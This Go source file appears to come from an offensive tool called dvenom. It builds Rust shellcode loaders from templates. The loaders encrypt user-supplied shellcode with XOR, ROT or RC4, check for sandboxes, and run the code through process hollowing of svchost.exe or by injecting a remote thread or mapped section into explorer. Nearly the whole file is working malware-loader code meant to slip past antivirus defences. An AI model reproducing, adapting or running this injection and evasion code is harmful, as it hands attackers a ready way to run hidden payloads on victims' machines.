package payloads

import (
	"bytes"
	"fmt"
	"github.com/Zerx0r/dvenom/internal/cryptor"
	"github.com/Zerx0r/dvenom/internal/helpers"
	"log"
	"text/template"
)

func rustMain() string {
	return `
{{.Values.Imports}}

{{.Values.ExtSysCalls}}

{{.Values.DeclareDataTypes}}

{{.Values.LoaderExtSysCalls}}

{{.Values.DeclareSysConst}}
fn main() {

    const KERNEL32_DLL: &'static [u8] = b"kernel32\0";
    
    const VIRTUALALLOCEXNUMA: &'static [u8] = b"VirtualAllocExNuma\0";
    const GETCURRENTPROCESS: &'static [u8] = b"GetCurrentProcess\0";
    const FLSALLOC: &'static [u8] = b"FlsAlloc\0";

	unsafe {
		let module_kernel32 = LoadLibraryA(KERNEL32_DLL.as_ptr() as *const u8);

        let h_virtual_alloc_ex_numa = GetProcAddress(module_kernel32, VIRTUALALLOCEXNUMA.as_ptr() as *const u8);
        let h_get_current_process = GetProcAddress(module_kernel32, GETCURRENTPROCESS.as_ptr() as *const u8);
        let h_fls_alloc = GetProcAddress(module_kernel32, FLSALLOC.as_ptr() as *const u8);

        let VirtualAllocExNuma = std::mem::transmute::<*const usize, FnVirtualAllocExNuma>(h_virtual_alloc_ex_numa);
        let GetCurrentProcess = std::mem::transmute::<*const usize, FnGetCurrentProcess>(h_get_current_process);
        let FlsAlloc = std::mem::transmute::<*const usize, FnFlsAlloc>(h_fls_alloc);

		let mem = VirtualAllocExNuma(GetCurrentProcess(), ptr::null_mut(), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ_WRITE, 0);
        if mem == ptr::null_mut() {
            return;
        }
        let check = FlsAlloc(ptr::null_mut());
        if check == 0xFFFFFFFF {
            return;
        }
		
		let mut buf: Vec<u8> = vec![{{.Values.ShellCode}}];
		{{.Values.DecodeFunc}}
		{{.Values.LoaderFunc}}
	}
}
{{.Values.StartFunc}}
{{ if .Values.GetProcFunc }} {{.Values.GetProcFunc}} {{end}}
{{.Values.DecryptFunc}}
`
}

func rustHollowImports() string {
	return `
// add libc = "0.2" to your Cargo.toml under [dependencies] 
extern crate libc;
use std::os::raw::{c_void, c_int, c_short, c_char};
use std::ptr;
`
}

func rustProcessInjectImports() string {
	return `
// add libc = "0.2" to your Cargo.toml under [dependencies] 
// add sysinfo = "0.29" to your Cargo.toml under [dependencies] 
extern crate libc;
use std::os::raw::{c_void, c_int};
use std::ptr;
use sysinfo::{ProcessExt, SystemExt, PidExt};
`
}

func rustExtSysFunc() string {
	return `
#[link(name = "kernel32")]
extern "stdcall" {
    pub fn LoadLibraryA(lpFileName: *const u8) -> *const usize;
    pub fn GetProcAddress(hModule: *const usize, lpProcName: *const u8) -> *const usize;
}
`
}
func rustHollowDataTypes() string {
	return `
type LPSTR = *mut c_char;
type LPCSTR = *const c_char;
type HANDLE = *mut c_void;
type LPVOID = *mut c_void;
type PVOID = *mut c_void;
type SIZE_T = usize;
type DWORD = u32;
type PDWORD = *mut DWORD;
type BOOL = c_int;
type LPSTARTUPINFO = *mut STARTUPINFO;
type LPPROCESS_INFORMATION = *mut PROCESS_INFORMATION;
type LPROCESS_BASIC_INFORMATION = *mut PROCESS_BASIC_INFORMATION;

#[repr(C)]
struct STARTUPINFO {
    cb: c_int,
    lpReserved: PVOID,
    lpDesktop: PVOID,
    lpTitle: PVOID,
    dwX: c_int,
    dwY: c_int,
    dwXSize: c_int,
    dwYSize: c_int,
    dwXCountChars: c_int,
    dwYCountChars: c_int,
    dwFillAttribute: c_int,
    dwFlags: c_int,
    wShowWindow: c_short,
    cbReserved2: c_short,
    lpReserved2: PVOID,
    hStdInput: HANDLE,
    hStdOutput: HANDLE,
    hStdError: HANDLE,
}

#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess: HANDLE,
    hThread: HANDLE,
    dwProcessId: DWORD,
    dwThreadId: DWORD,
}

#[repr(C)]
struct PROCESS_BASIC_INFORMATION {
    Reserved1: PVOID,
    PebAddress: PVOID,
    Reserved2: PVOID,
    Reserved3: PVOID,
    UniquePid: PVOID,
    MoreReserved: PVOID,
}
`
}
func rustProcessInjectDataTypes() string {
	return `
type HANDLE = *mut c_void;
type PVOID = *mut c_void;
type LPVOID = *mut c_void;
type SIZE_T = usize;
type DWORD = u32;
type PDWORD = *mut DWORD;
type BOOL = c_int;
`
}
func rustHollowExtSysCall() string {
	return `
type FnVirtualAllocExNuma = extern "stdcall" fn(hProcess: HANDLE, lpAddress: PVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD, nndPreferred: DWORD) -> LPVOID;
type FnGetCurrentProcess = extern "stdcall" fn() -> LPVOID;
type FnFlsAlloc = extern "stdcall" fn(lpCallback: LPVOID) -> DWORD;
type FnCreateProcess = extern "stdcall" fn(
    lpApplicationName: LPCSTR,
    lpCommandLine: LPSTR,
    lpProcessAttributes: PVOID,
    lpThreadAttributes: PVOID,
    bInheritHandles: BOOL,
    dwCreationFlags: DWORD,
    lpEnvironment: LPVOID,
    lpCurrentDirectory: LPCSTR,
    lpStartupInfo: LPSTARTUPINFO,
    lpProcessInformation: LPPROCESS_INFORMATION,
) -> BOOL;
type FnZwQueryInformationProcess = extern "stdcall" fn(hProcess: HANDLE, procInformationClass: DWORD, procInformation: LPROCESS_BASIC_INFORMATION, ProcInfoLen: DWORD, retlen: PDWORD) -> c_int;
type FnReadProcessMemory = extern "stdcall" fn(hProcess: HANDLE, lpBaseAddress: PVOID, lpBuffer: LPVOID, nSize: SIZE_T, lpNumberOfBytesRead: PDWORD) -> BOOL;
type FnWriteProcessMemory = extern "stdcall" fn(hProcess: LPVOID, lpBaseAddress: LPVOID, lpBuffer: LPVOID, size: SIZE_T, lpNumberOfBytesWrittern: PDWORD) -> BOOL;
type FnResumeThread = extern "stdcall" fn(hThread: HANDLE) -> DWORD;
`
}

func rustNtInjectExtSysCall() string {
	return `
type FnVirtualAllocExNuma = extern "stdcall" fn(hProcess: HANDLE, lpAddress: PVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD, nndPreferred: DWORD) -> LPVOID;
type FnGetCurrentProcess = extern "stdcall" fn() -> LPVOID;
type FnFlsAlloc = extern "stdcall" fn(lpCallback: LPVOID) -> DWORD;
type FnNtCreateSection = extern "stdcall" fn(
    sectionHandle: HANDLE, 
    desiredAccess: DWORD, 
    objectAttributes: PVOID, 
    maximumSize: PDWORD, 
    sectionPageProtection: DWORD, 
    allocationAttributes: DWORD, 
    fileHandle: PVOID,
) -> DWORD;
type FnNtMapViewOfSection = extern "stdcall" fn(
    sectionHandle: LPVOID,
    processHandle: LPVOID,
    baseAddress: LPVOID,
    zeroBits: PVOID,
    commitSize: PVOID,
    sectionOffset: PDWORD,
    viewSize: PDWORD,
    inheritDisposition: DWORD,
    allocationType: DWORD,
    win32Protect: DWORD,
) -> DWORD;
type FnNtUnmapViewOfSection = extern "stdcall" fn(hProc: HANDLE, baseAddr: LPVOID) -> DWORD;
type FnNtClose = extern "stdcall" fn(hObject: LPVOID) -> BOOL;
type FnOpenProcess = extern "stdcall" fn(processAccess: DWORD, bInheritHandle: BOOL, processId: DWORD) -> LPVOID;
type FnCreateRemoteThread = extern "stdcall" fn(hProcess: LPVOID, lpThreadAttributes: LPVOID, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPVOID) -> LPVOID;
`
}
func rustPInjectExtSysCall() string {
	return `
type FnVirtualAllocExNuma = extern "stdcall" fn(hProcess: HANDLE, lpAddress: PVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD, nndPreferred: DWORD) -> LPVOID;
type FnGetCurrentProcess = extern "stdcall" fn() -> LPVOID;
type FnFlsAlloc = extern "stdcall" fn(lpCallback: LPVOID) -> DWORD;
type FnOpenProcess = extern "stdcall" fn(processAccess: DWORD, bInheritHandle: BOOL, processId: DWORD) -> LPVOID;
type FnVirtualAllocEx = extern "stdcall" fn(hProcess: LPVOID, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID;
type FnWriteProcessMemory = extern "stdcall" fn(hProcess: LPVOID, lpBaseAddress: LPVOID, lpBuffer: LPVOID, size: SIZE_T, lpNumberOfBytesWrittern: PDWORD) -> BOOL;
type FnCreateRemoteThread = extern "stdcall" fn(hProcess: LPVOID, lpThreadAttributes: LPVOID, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPVOID) -> LPVOID;
`
}

func rustDeclareConstant() string {
	return `
pub const PAGE_EXECUTE_READ_WRITE: DWORD = 0x40;
pub const MEM_RESERVE: DWORD = 0x2000;
pub const MEM_COMMIT: DWORD = 0x1000;
`
}

func rustStartHollowFunc() string {
	return `
unsafe fn start(module_kernel32: *const usize, buf: &Vec<u8>) {
    const NTDLL_DLL: &'static [u8] = b"ntdll\0";
    let module_ntdll = LoadLibraryA(NTDLL_DLL.as_ptr() as *const u8);

    const CREATEPROCESS: &'static [u8] = b"CreateProcessA\0";
    const ZWQUERYINFORMATIONPROCESS: &'static [u8] = b"ZwQueryInformationProcess\0";
    const READPROCESSMEMORY: &'static [u8] = b"ReadProcessMemory\0";
    const WRITEPROCESSMEMORY: &'static [u8] = b"WriteProcessMemory\0";
    const RESUMETHREAD: &'static [u8] = b"ResumeThread\0";

    let h_create_process = GetProcAddress(module_kernel32, CREATEPROCESS.as_ptr() as *const u8);
    let h_zwquery_information_process = GetProcAddress(module_ntdll, ZWQUERYINFORMATIONPROCESS.as_ptr() as *const u8);
    let h_read_process_memory = GetProcAddress(module_kernel32, READPROCESSMEMORY.as_ptr() as *const u8);
    let h_write_process_memory = GetProcAddress(module_kernel32, WRITEPROCESSMEMORY.as_ptr() as *const u8);
    let h_resume_thread = GetProcAddress(module_kernel32, RESUMETHREAD.as_ptr() as *const u8);

    let CreateProcess = std::mem::transmute::<*const usize, FnCreateProcess>(h_create_process);
    let ZwQueryInformationProcess = std::mem::transmute::<*const usize, FnZwQueryInformationProcess>(h_zwquery_information_process);
    let ReadProcessMemory = std::mem::transmute::<*const usize, FnReadProcessMemory>(h_read_process_memory);
    let WriteProcessMemory = std::mem::transmute::<*const usize, FnWriteProcessMemory>(h_write_process_memory);
    let ResumeThread = std::mem::transmute::<*const usize, FnResumeThread>(h_resume_thread);


    let mut si: STARTUPINFO = STARTUPINFO {
        cb: 0,
        lpReserved: ptr::null_mut(),
        lpDesktop: ptr::null_mut(),
        lpTitle: ptr::null_mut(),
        dwX: 0,
        dwY: 0,
        dwXSize: 0,
        dwYSize: 0,
        dwXCountChars: 0,
        dwYCountChars: 0,
        dwFillAttribute: 0,
        dwFlags: 0,
        wShowWindow: 0,
        cbReserved2: 0,
        lpReserved2: ptr::null_mut(),
        hStdInput: ptr::null_mut(),
        hStdOutput: ptr::null_mut(),
        hStdError: ptr::null_mut(),
    };
    let mut pi = PROCESS_INFORMATION {
        hProcess: ptr::null_mut(),
        hThread: ptr::null_mut(),
        dwProcessId: 0,
        dwThreadId:0,
    };
    let cmd_line = std::ffi::CString::new("c:\\Windows\\System32\\svchost.exe").unwrap();
    CreateProcess(
        ptr::null_mut(), 
        cmd_line.as_ptr() as *mut i8, 
        ptr::null_mut(), 
        ptr::null_mut(),
        0, 
        0x4, 
        ptr::null_mut(),
        ptr::null_mut(),
        &mut si, 
        &mut pi
    );
    let mut bi = PROCESS_BASIC_INFORMATION {
        Reserved1: ptr::null_mut(),
        PebAddress: ptr::null_mut(),
        Reserved2: ptr::null_mut(),
        Reserved3: ptr::null_mut(),
        UniquePid: ptr::null_mut(),
        MoreReserved: ptr::null_mut(),
    };
    let h_process: HANDLE = pi.hProcess;  
    let h_thread: HANDLE = pi.hThread;
    ZwQueryInformationProcess(h_process, 0, &mut bi , (std::mem::size_of::<usize>() * 6) as u32, ptr::null_mut());

    let image_base_offset = bi.PebAddress as u64 + 0x10;

    let mut image_base_buffer = [0; std::mem::size_of::<usize>()];

    ReadProcessMemory(h_process, image_base_offset as LPVOID, image_base_buffer.as_mut_ptr() as LPVOID, image_base_buffer.len(), ptr::null_mut());

    let image_base_address = usize::from_ne_bytes(image_base_buffer);

    let mut header_buffer = [0; 0x200];
    ReadProcessMemory(h_process, image_base_address as LPVOID, header_buffer.as_mut_ptr() as LPVOID, header_buffer.len(), ptr::null_mut());

    let e_lfanew_offset = u32::from_ne_bytes(header_buffer[0x3C..0x40].try_into().unwrap());
    let option_header = e_lfanew_offset + 0x28;
    let entry_point = u32::from_ne_bytes(header_buffer[option_header as usize..(option_header+4) as usize].try_into().unwrap());
    let entry_point_address = (entry_point as usize + image_base_address) as LPVOID;
    WriteProcessMemory(h_process, entry_point_address, buf.as_ptr() as LPVOID, buf.len(), ptr::null_mut());
    ResumeThread(h_thread);
}
`
}

func rustStartNtInjectFunc() string {
	return `
unsafe fn start(module_kernel32: *const usize, buf: &Vec<u8>, target_process: &str) {
	const NTDLL_DLL: &'static [u8] = b"ntdll\0";
    let module_ntdll = LoadLibraryA(NTDLL_DLL.as_ptr() as *const u8);

    const GETCURRENTPROCESS: &'static [u8] = b"GetCurrentProcess\0";
    const NTCREATESECTION: &'static [u8] = b"NtCreateSection\0";
    const NTMAPVIEWOFSECTION: &'static [u8] = b"NtMapViewOfSection\0";
    const NTUNMAPVIEWOFSECTION: &'static [u8] = b"NtUnmapViewOfSection\0";
    const NTCLOSE: &'static [u8] = b"NtClose\0";
    const OPENPROCESS: &'static [u8] = b"OpenProcess\0";
    const CREATEREMOTETHREAD: &'static [u8] = b"CreateRemoteThread\0";

    let h_get_current_process = GetProcAddress(module_kernel32, GETCURRENTPROCESS.as_ptr() as *const u8);
    let h_nt_create_section = GetProcAddress(module_ntdll, NTCREATESECTION.as_ptr() as *const u8);
    let h_nt_map_view_of_section = GetProcAddress(module_ntdll, NTMAPVIEWOFSECTION.as_ptr() as *const u8);
    let h_nt_unmap_view_of_section = GetProcAddress(module_ntdll, NTUNMAPVIEWOFSECTION.as_ptr() as *const u8);
    let h_nt_close = GetProcAddress(module_ntdll, NTCLOSE.as_ptr() as *const u8);
    let h_open_process = GetProcAddress(module_kernel32, OPENPROCESS.as_ptr() as *const u8);
    let h_create_remote_thread = GetProcAddress(module_kernel32, CREATEREMOTETHREAD.as_ptr() as *const u8);

    let GetCurrentProcess = std::mem::transmute::<*const usize, FnGetCurrentProcess>(h_get_current_process);
    let NtCreateSection = std::mem::transmute::<*const usize, FnNtCreateSection>(h_nt_create_section);
    let NtMapViewOfSection = std::mem::transmute::<*const usize, FnNtMapViewOfSection>(h_nt_map_view_of_section);
    let NtUnmapViewOfSection = std::mem::transmute::<*const usize, FnNtUnmapViewOfSection>(h_nt_unmap_view_of_section);
    let NtClose = std::mem::transmute::<*const usize, FnNtClose>(h_nt_close);
    let OpenProcess = std::mem::transmute::<*const usize, FnOpenProcess>(h_open_process);
    let CreateRemoteThread = std::mem::transmute::<*const usize, FnCreateRemoteThread>(h_create_remote_thread);

    let mut h_section: HANDLE = ptr::null_mut();
    let mut maximum_size: PDWORD = 4096 as *mut u32;

    NtCreateSection(&mut h_section as *mut _ as HANDLE, 0xe, ptr::null_mut(), &mut maximum_size as *mut _ as PDWORD, 0x40, 0x8000000, ptr::null_mut());  

    let mut local_section_address: LPVOID = ptr::null_mut();
    let mut size: PDWORD = ptr::null_mut();
    NtMapViewOfSection(h_section, GetCurrentProcess(), &mut local_section_address as *mut _ as LPVOID, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), &mut size as *mut _ as PDWORD, 2, 0, 0x04);

    let h_process = OpenProcess(0x001F0FFF, 0, get_process_id_by_name("explorer"));
    let mut remote_section_address: LPVOID = ptr::null_mut();
    NtMapViewOfSection(h_section, h_process, &mut remote_section_address as *mut _ as LPVOID, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), &mut size as *mut _ as PDWORD, 2, 0, 0x20);
    libc::memcpy(local_section_address, buf.as_ptr() as *const c_void, buf.len());
    
    NtUnmapViewOfSection(GetCurrentProcess(), local_section_address);
    NtClose(h_section);
    
    CreateRemoteThread(h_process, ptr::null_mut(), 0, remote_section_address, ptr::null_mut(), 0, ptr::null_mut());
}
`
}

func rustStartPInjectFunc() string {
	return `
unsafe fn start(module_kernel32: *const usize, buf: &Vec<u8>, target_process: &str) {
    const OPENPROCESS: &'static [u8] = b"OpenProcess\0";
    const VIRTUALALLOCEX: &'static [u8] = b"VirtualAllocEx\0";
    const WRITEPROCESSMEMORY: &'static [u8] = b"WriteProcessMemory\0";
    const CREATEREMOTETHREAD: &'static [u8] = b"CreateRemoteThread\0";

    let h_open_process = GetProcAddress(module_kernel32, OPENPROCESS.as_ptr() as *const u8);
    let h_virtual_allocex = GetProcAddress(module_kernel32, VIRTUALALLOCEX.as_ptr() as *const u8);
    let h_write_process_memory = GetProcAddress(module_kernel32, WRITEPROCESSMEMORY.as_ptr() as *const u8);
    let h_create_remote_thread = GetProcAddress(module_kernel32, CREATEREMOTETHREAD.as_ptr() as *const u8);

    let OpenProcess = std::mem::transmute::<*const usize, FnOpenProcess>(h_open_process);
    let VirtualAllocEx = std::mem::transmute::<*const usize, FnVirtualAllocEx>(h_virtual_allocex);
    let WriteProcessMemory = std::mem::transmute::<*const usize, FnWriteProcessMemory>(h_write_process_memory);
    let CreateRemoteThread = std::mem::transmute::<*const usize, FnCreateRemoteThread>(h_create_remote_thread);

    let size = buf.len();
    let h_process = OpenProcess(0x001F0FFF, 0, get_process_id_by_name("explorer"));
    let addr = VirtualAllocEx(h_process, ptr::null_mut(), buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ_WRITE);
    WriteProcessMemory(h_process, addr, buf.as_ptr() as LPVOID, size as usize, ptr::null_mut());
    CreateRemoteThread(h_process, ptr::null_mut(), 0, addr, ptr::null_mut(), 0 , ptr::null_mut());
}
`
}

func rustGetProcByIdFunc() string {
	return `
fn get_process_id_by_name(target_process: &str) -> u32 {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id: u32 = 0;
    for p in system.processes_by_name(target_process) {
        process_id = p.pid().as_u32();
    }
    return process_id;
}
`
}

func rustDecryptFunc(cipherType string) string {
	switch cipherType {
	case "xor":
		return `
fn decrypt(buf: &mut Vec<u8>, key: &[u8]) {
    let size = key.len();
    for (i, byte) in  buf.iter_mut().enumerate() {
        *byte ^= key[i % size];
    }
}
`
	case "rot":
		return `
fn decrypt(buf: &mut Vec<u8>, key: &u8) {
    for byte in  buf.iter_mut() {
        *byte = byte.wrapping_sub(*key);
    }
}
`
	case "rc4":
		return `
fn decrypt(buf: &mut Vec<u8>, key: &Vec<u8>) {
    let mut i: usize = 0;
    let mut j: usize = 0;

    let mut perm: Vec<usize> = (0..256).collect();

    for k in 0..256 {
        j = (j + perm[k] + key[k % key.len()] as usize) % 256;
        perm.swap(k, j);
    }

    j = 0;
    for k in 0..buf.len() {
        i = (i + 1) % 256;
        j = (j + perm[i]) % 256;
        perm.swap(i, j);
        let t = (perm[i] + perm[j]) % 256;
        buf[k] ^= perm[t] as u8;
    }
}
`
	default:
		return ""
	}
}
func rustLoaderFunc(methodType string, procName string) string {
	var str string
	switch methodType {
	case "pinject", "ntinject":
		str = fmt.Sprintf(`start(module_kernel32, &buf, "%s");`, procName)
	default:
		str = "start(module_kernel32, &buf);"
	}
	return str
}
func rustXor(xorKey string) string {
	str := `
	decrypt(&mut buf, b"%s");
	`
	return fmt.Sprintf(str, xorKey)
}

func rustRot(rotKey string) string {
	str := `
	decrypt(&mut buf, &%s);
	`
	return fmt.Sprintf(str, rotKey)
}

func rustRC4(key []byte) string {
	str := `
	let key: Vec<u8> = vec![ %s ];
	decrypt(&mut buf, &key);
	`
	return fmt.Sprintf(str, helpers.BytesToHexArray(key))
}

func BuildRustTemplate(methodType string, cipherType string, key string, procName string, shellCode []byte) string {
	field := helpers.Field{
		Values: make(map[string]string),
	}
	var value []byte
	var err error
	switch cipherType {
	case "xor":
		value = cryptor.Xor(key, shellCode)
		field.SetValue("DecodeFunc", rustXor(key))
	case "rot":
		value = cryptor.Rot(key, shellCode)
		field.SetValue("DecodeFunc", rustRot(key))
	case "rc4":
		value, err = cryptor.Rc4([]byte(key), shellCode)
		if err != nil {
			log.Fatal("[x] Error: RC4 encryption failed.", err)
		}
		field.SetValue("DecodeFunc", rustRC4([]byte(key)))
	default:
		log.Fatalf("[x] Error: Cipher type %s is not supported with rs payload. Supported types: (xor, rot, rc4)", cipherType)
	}
	switch methodType {
	case "pinject":
		field.SetValue("Imports", rustProcessInjectImports())
		field.SetValue("DeclareDataTypes", rustProcessInjectDataTypes())
		field.SetValue("LoaderExtSysCalls", rustPInjectExtSysCall())
		field.SetValue("StartFunc", rustStartPInjectFunc())
		field.SetValue("GetProcFunc", rustGetProcByIdFunc())
	case "hollow":
		field.SetValue("Imports", rustHollowImports())
		field.SetValue("DeclareDataTypes", rustHollowDataTypes())
		field.SetValue("LoaderExtSysCalls", rustHollowExtSysCall())
		field.SetValue("StartFunc", rustStartHollowFunc())
	case "ntinject":
		field.SetValue("Imports", rustProcessInjectImports())
		field.SetValue("DeclareDataTypes", rustProcessInjectDataTypes())
		field.SetValue("LoaderExtSysCalls", rustNtInjectExtSysCall())
		field.SetValue("StartFunc", rustStartNtInjectFunc())
		field.SetValue("GetProcFunc", rustGetProcByIdFunc())
	default:
		log.Fatalf("[x] Error: Method type %s is not supported in rs payload. Supported types: (pinject, hollow, ntinject)", methodType)
		return ""
	}
	field.SetValue("DeclareSysConst", rustDeclareConstant())
	field.SetValue("ExtSysCalls", rustExtSysFunc())
	field.SetValue("LoaderFunc", rustLoaderFunc(methodType, procName))
	field.SetValue("ShellCode", helpers.BytesToHexArray(value))
	field.SetValue("DecryptFunc", rustDecryptFunc(cipherType))

	return buildRustTemplate(field, rustMain())
}

func buildRustTemplate(field helpers.Field, vbaTemplate string) string {
	var buffer bytes.Buffer
	t, err := template.New("RustTemplate").Parse(vbaTemplate)
	if err != nil {
		log.Fatal("[x] Error: Failed to generate rs code.", err)
	}

	if err := t.Execute(&buffer, field); err != nil {
		log.Fatal("[x] Error: Failed to generate rs code.", err)
	}
	return buffer.String()
}
